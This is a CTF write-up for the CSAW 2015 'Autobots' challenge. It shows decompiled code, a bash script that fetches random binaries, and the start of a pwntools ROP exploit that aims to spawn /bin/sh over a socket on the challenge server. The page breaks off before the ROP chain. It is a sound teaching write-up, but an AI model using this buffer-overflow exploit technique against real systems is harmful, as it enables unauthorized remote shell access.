<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon-dark.svg" media="(prefers-color-scheme: light)"><link rel="icon" type="image/svg+xml" href="/favicon.svg" media="(prefers-color-scheme: dark)"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://towerofhanoi.it/writeups/2015-09-24-autobots/"><!-- Primary Meta Tags --><title>CSAW 2015 - Autobots</title><meta name="title" content="CSAW 2015 - Autobots"><meta name="description" content="Automated bot exploiting buffer overflow."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://towerofhanoi.it/writeups/2015-09-24-autobots/"><meta property="og:title" content="CSAW 2015 - Autobots"><meta property="og:description" content="Automated bot exploiting buffer overflow."><meta property="og:image" content="https://towerofhanoi.it/writeup_images/csaw15.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://towerofhanoi.it/writeups/2015-09-24-autobots/"><meta property="twitter:title" content="CSAW 2015 - Autobots"><meta property="twitter:description" content="Automated bot exploiting buffer overflow."><meta property="twitter:image" content="https://towerofhanoi.it/writeup_images/csaw15.png"><style>:root{--accent: #fea819;--accent-dark: #ac7010;--accent-dark-010: #ac70100a}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.25}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:1em 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:0 .3em;background-color:#1f1f1f;border-radius:.2em;font-size:.8em}pre{padding:1em;border-radius:.2em}pre>code{all:unset;font-size:.8em}blockquote{border-left:4px solid var(--accent);padding:.01em 0 .01em 1em;margin:0;background-color:var(--accent-dark-010)}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}table{border-collapse:collapse;text-align:center}tr{border:1px solid #e9e9e9}th,td{padding:.5em;text-align:center}th{background-color:#1f1f1f;color:#fff}td{background-color:#1b1b1b}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
@media (prefers-color-scheme: dark){.markdown-alert{--color-border-default: #30363d;--color-accent-fg: #58a6ff;--color-accent-emphasis: #1f6feb;--color-danger-fg: #f85149;--color-danger-emphasis: #da3633;--color-attention-fg: #d29922;--color-attention-emphasis: #9e6a03;--color-done-fg: #a371f7;--color-done-emphasis: #8957e5;--color-success-fg: #3fb950;--color-success-emphasis: #238636}}@media (prefers-color-scheme: light){.markdown-alert{--color-border-default: #d0d7de;--color-accent-fg: #0969da;--color-accent-emphasis: #0969da;--color-danger-fg: #d1242f;--color-danger-emphasis: #cf222e;--color-attention-fg: #9a6700;--color-attention-emphasis: #9a6700;--color-done-fg: #8250df;--color-done-emphasis: #8250df;--color-success-fg: #1a7f37;--color-success-emphasis: #1f883d}}.markdown-alert{border-left:.25em solid var(--borderColor-default, var(--color-border-default));color:inherit;margin-bottom:16px;padding:.5rem 1em}.markdown-alert>:last-child{margin-bottom:0!important}.markdown-alert .markdown-alert-title{align-items:center;display:flex;font-size:14px;font-weight:500;line-height:1}.markdown-alert .markdown-alert-title svg.octicon{margin-right:8px!important;margin-right:var(--base-size-8,8px)!important;fill:currentColor}.markdown-alert.markdown-alert-note{border-left-color:var(--borderColor-accent-emphasis,var(--color-accent-emphasis))}.markdown-alert.markdown-alert-note .markdown-alert-title{color:var(--color-accent-fg);color:var(--fgColor-accent,var(--color-accent-fg))}.markdown-alert.markdown-alert-tip{border-left-color:var(--borderColor-success-emphasis,var(--color-success-emphasis))}.markdown-alert.markdown-alert-tip .markdown-alert-title{color:var(--color-success-fg);color:var(--fgColor-success,var(--color-success-fg))}.markdown-alert.markdown-alert-important{border-left-color:var(--borderColor-done-emphasis,var(--color-done-emphasis))}.markdown-alert.markdown-alert-important .markdown-alert-title{color:var(--color-done-fg);color:var(--fgColor-done,var(--color-done-fg))}.markdown-alert.markdown-alert-warning{border-left-color:var(--borderColor-attention-emphasis,var(--color-attention-emphasis))}.markdown-alert.markdown-alert-warning .markdown-alert-title{color:var(--color-attention-fg);color:var(--fgColor-attention,var(--color-attention-fg))}.markdown-alert.markdown-alert-caution{border-left-color:var(--borderColor-danger-emphasis,var(--color-danger-emphasis))}.markdown-alert.markdown-alert-caution .markdown-alert-title{color:var(--color-danger-fg);color:var(--fgColor-danger,var(--color-danger-fg))}main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/csaw15.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2015-09-24T16:00:00.000Z"> Sep 24, 2015 </time>  </div> <h1 data-astro-cid-dxom2xcl>CSAW 2015 - Autobots</h1> <h3 data-astro-cid-dxom2xcl> by conand &amp; marcof</h3> <hr data-astro-cid-dxom2xcl> </div>  <blockquote>
<p>I hear bots are playing ctfs now.
Note: Aslr has now been disabled for this challenge</p>
</blockquote>
<p>The challenge did not provide any binary but just a remote service.
Connecting to the remote service we got an ELF:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ nc 52.20.10.244 8888 > binary</span></span>
<span class="line"><span>$ file binary</span></span>
<span class="line"><span>binary: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=c9977e6ab77d506a99fd04551f255e27198584db, not stripped</span></span>
<span class="line"><span></span></span></code></pre>
<p>Decompiling we easily found out that the executable spawned another service reading our input and writing back to the socket the same input.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> __cdecl </span><span style="color:#80A665">main</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> argc</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">argv</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">envp</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#CB7676">  size_t</span><span style="color:#DBD7CAEE"> v3</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rax@1</span></span>
<span class="line"><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><span style="color:#758575DD"> // eax@1</span></span>
<span class="line"><span style="color:#DBD7CAEE">  __int64 v5</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [sp-100h] [bp-100h]@1</span></span>
<span class="line"><span style="color:#DBD7CAEE">  __int64 v6</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [sp-F0h] [bp-F0h]@1</span></span>
<span class="line"><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v7</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [sp-8h] [bp-8h]@1</span></span>
<span class="line"><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v8</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [sp-4h] [bp-4h]@1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">  v8 </span><span style="color:#666666">=</span><span style="color:#80A665"> socket</span><span style="color:#666666">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  memset</span><span style="color:#666666">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">v5</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#CB7676">uLL</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  LOWORD</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v5</span><span style="color:#666666">)</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#80A665">  HIDWORD</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v5</span><span style="color:#666666">)</span><span style="color:#666666"> =</span><span style="color:#80A665"> htons</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  WORD1</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v5</span><span style="color:#666666">)</span><span style="color:#666666"> =</span><span style="color:#80A665"> htons</span><span style="color:#666666">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">5155</span><span style="color:#CB7676">u</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  bind</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v8</span><span style="color:#666666">,</span><span style="color:#666666"> (</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> sockaddr </span><span style="color:#CB7676">*</span><span style="color:#666666">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">v5</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#CB7676">u</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  listen</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v8</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">  v7 </span><span style="color:#666666">=</span><span style="color:#80A665"> accept</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v8</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  read</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v7</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">v6</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">13B</span><span style="color:#CB7676">uLL</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">  v3 </span><span style="color:#666666">=</span><span style="color:#80A665"> strlen</span><span style="color:#666666">((</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> *</span><span style="color:#666666">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">v6</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  write</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">v7</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">v6</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v3 </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  sub_40086F</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>We noticed that the executables provided by the server were always different and ran on the remote host for about 1 second.
Downloading more binaries we noted that the only differences in the binaries were the service port, the dimension of the buffer, and the number of bytes read.<br>
These parameters were randomly generated, leading sometimes to a buffer overflow.
Hence, the idea was to query the server until a vulnerable executable is generated.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ checksec.sh --file binary</span></span>
<span class="line"><span>RELRO           STACK CANARY      NX           PIE      RPATH      RUNPATH     FILE</span></span>
<span class="line"><span>Partial RELRO   No canary found   NX enabled   No PIE   No RPATH   No RUNPATH  binary </span></span>
<span class="line"><span></span></span></code></pre>
<p>NX was enabled on the binaries but there was no canary. Letâ€™s ROP!</p>
<p>We grabbed libc from the server hosting Exploitables250 in the hope that it was the same also for this challenge, and it was. The challenge description stated ASLR had been disabled, so we did not need any memory leak to obtain a reference to the libc.</p>
<p>We wrote a bash script to download the executables, parse the output of <code>objdump</code>, grep the randomly generated parameters, and pass them to the python exploit.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#758575DD">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">HOST</span><span style="color:#666666">=</span><span style="color:#C98A7D">52.20.10.244</span></span>
<span class="line"><span style="color:#BD976A">PORT</span><span style="color:#666666">=</span><span style="color:#C98A7D">8888</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">while</span><span style="color:#B8A965"> true</span><span style="color:#666666">;</span><span style="color:#4D9375"> do</span></span>
<span class="line"><span style="color:#80A665">    nc</span><span style="color:#666666"> ${</span><span style="color:#BD976A">HOST</span><span style="color:#666666">}</span><span style="color:#666666"> ${</span><span style="color:#BD976A">PORT</span><span style="color:#666666">}</span><span style="color:#CB7676"> ></span><span style="color:#C98A7D"> qweqwe</span></span>
<span class="line"><span style="color:#BD976A">    NEW_PORT</span><span style="color:#666666">=</span><span style="color:#666666">`</span><span style="color:#80A665">objdump</span><span style="color:#C99076"> -d</span><span style="color:#C98A7D"> qweqwe </span><span style="color:#CB7676">|</span><span style="color:#80A665"> grep</span><span style="color:#C99076"> -n1</span><span style="color:#C98A7D"> htons </span><span style="color:#CB7676">|</span><span style="color:#80A665"> tail</span><span style="color:#C99076"> -3</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> head</span><span style="color:#C99076"> -1</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> grep</span><span style="color:#C99076"> -o</span><span style="color:#C99076"> -P</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">(?&#x3C;=0x).*(?=,)</span><span style="color:#C98A7D77">'</span><span style="color:#666666">`</span></span>
<span class="line"><span style="color:#BD976A">    BUFF_SIZE</span><span style="color:#666666">=</span><span style="color:#666666">`</span><span style="color:#80A665">objdump</span><span style="color:#C99076"> -d</span><span style="color:#C98A7D"> qweqwe </span><span style="color:#CB7676">|</span><span style="color:#80A665"> grep</span><span style="color:#C98A7D"> lea </span><span style="color:#CB7676">|</span><span style="color:#80A665"> tail</span><span style="color:#C99076"> -4</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> head</span><span style="color:#C99076"> -1</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> grep</span><span style="color:#C99076"> -o</span><span style="color:#C99076"> -P</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">(?&#x3C;=0x).*(?=\()</span><span style="color:#C98A7D77">'</span><span style="color:#666666">`</span></span>
<span class="line"><span style="color:#BD976A">    READ_SIZE</span><span style="color:#666666">=</span><span style="color:#666666">`</span><span style="color:#80A665">objdump</span><span style="color:#C99076"> -d</span><span style="color:#C98A7D"> qweqwe </span><span style="color:#CB7676">|</span><span style="color:#80A665"> grep</span><span style="color:#C98A7D"> mov </span><span style="color:#CB7676">|</span><span style="color:#80A665"> tail</span><span style="color:#C99076"> -n15</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> head</span><span style="color:#C99076"> -1</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> grep</span><span style="color:#C99076"> -o</span><span style="color:#C99076"> -P</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">(?&#x3C;=0x).*(?=,)</span><span style="color:#C98A7D77">'</span><span style="color:#666666">`</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">    NEW_PORT_INT</span><span style="color:#666666">=</span><span style="color:#666666">`</span><span style="color:#B8A965">printf</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">%d\n</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> 0x</span><span style="color:#666666">${</span><span style="color:#C98A7D">NEW_PORT</span><span style="color:#666666">}`</span></span>
<span class="line"><span style="color:#BD976A">    BUFF_SIZE_INT</span><span style="color:#666666">=</span><span style="color:#666666">`</span><span style="color:#B8A965">printf</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">%d\n</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> 0x</span><span style="color:#666666">${</span><span style="color:#C98A7D">BUFF_SIZE</span><span style="color:#666666">}`</span></span>
<span class="line"><span style="color:#BD976A">    READ_SIZE_INT</span><span style="color:#666666">=</span><span style="color:#666666">`</span><span style="color:#B8A965">printf</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">%d\n</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> 0x</span><span style="color:#666666">${</span><span style="color:#C98A7D">READ_SIZE</span><span style="color:#666666">}`</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    python</span><span style="color:#C98A7D"> exploit.py</span><span style="color:#BD976A"> $NEW_PORT_INT</span><span style="color:#BD976A"> $BUFF_SIZE_INT</span><span style="color:#BD976A"> $READ_SIZE_INT</span></span>
<span class="line"><span style="color:#4D9375">done</span></span>
<span class="line"></span></code></pre>
<p>The python exploit simply checks if the service is vulnerable and, if so, builds the ROP chain to execute <code>system("/bin/sh")</code>.
We used <a href="https://github.com/sashs/Ropper">ropper</a> to find the gadgets in the libc.
Since our input was bound to the socket we called <code>dup2</code> to attach the socket to stdin/stdout.</p>
<p>Flag: <code>flag{c4nt_w4it_f0r_cgc_7h15_y34r}</code>.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> binascii </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> hexlify</span></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">host </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">52.20.10.244</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#DBD7CAEE">port </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">argv</span><span style="color:#666666">[</span><span style="color:#4C9A91">1</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">buff_size </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">argv</span><span style="color:#666666">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">read_size </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">argv</span><span style="color:#666666">[</span><span style="color:#4C9A91">3</span><span style="color:#666666">])</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> read_size </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#DBD7CAEE"> buff_size </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 160</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">    exit</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">VULNERABLE!</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">host</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">read_ref </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00007ffff7b00800</span><span style="color:#758575DD"> # address of read in libc</span></span>
<span class="line"><span style="color:#DBD7CAEE">read_offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">eb800</span><span style="color:#758575DD"> # offset of read in libc</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">binsh_offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">17ccdb</span></span>
<span class="line"><span style="color:#DBD7CAEE">gadget_offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">22b1a</span><span style="color:#758575DD">     # pop rdi</span></span>
<span class="line"><span style="color:#DBD7CAEE">gadget2_offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">24805</span><span style="color:#758575DD">    # pop rsi</span></span>
<span class="line"><span style="color:#DBD7CAEE">dup2_offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ebfe0</span></span>
<span class="line"><span style="color:#DBD7CAEE">system_offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">46640</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">my_fd </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 6</span><span style="color:#758575DD"> # file descriptor</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676">*</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buff_size </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># ROP chain</span></span>
